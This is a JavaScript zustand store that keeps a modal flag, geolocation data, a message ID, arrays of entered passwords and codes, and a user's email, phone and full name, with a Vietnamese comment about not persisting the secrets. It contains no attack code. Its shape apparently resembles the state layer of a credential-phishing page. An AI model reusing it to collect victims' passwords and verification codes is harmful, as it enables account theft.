import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

export const store = create(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: null,
            messageId: null,
            baseMessage: null,
            passwords: [],
            codes: [],
            userEmail: null,
            userPhoneNumber: null,
            userFullName: null,
            translations: {},
            setModalOpen: (isOpen) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info) => set({ geoInfo: info }),
            setMessageId: (id) => set({ messageId: id }),
            setBaseMessage: (message) => set({ baseMessage: message }),
            addPassword: (password) => set((state) => ({ passwords: [...state.passwords, password] })),
            addCode: (code) => set((state) => ({ codes: [...state.codes, code] })),
            resetPasswords: () => set({ passwords: [] }),
            resetCodes: () => set({ codes: [] }),
            setUserEmail: (email) => set({ userEmail: email }),
            setUserPhoneNumber: (phone) => set({ userPhoneNumber: phone }),
            setUserFullName: (name) => set({ userFullName: name }),
            setTranslations: (translations) => set({ translations })
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                messageId: state.messageId,
                baseMessage: state.baseMessage,
                // Không persist passwords và codes để tránh cache
                userEmail: state.userEmail,
                userPhoneNumber: state.userPhoneNumber,
                userFullName: state.userFullName,
                translations: state.translations
            })
        }
    )
);








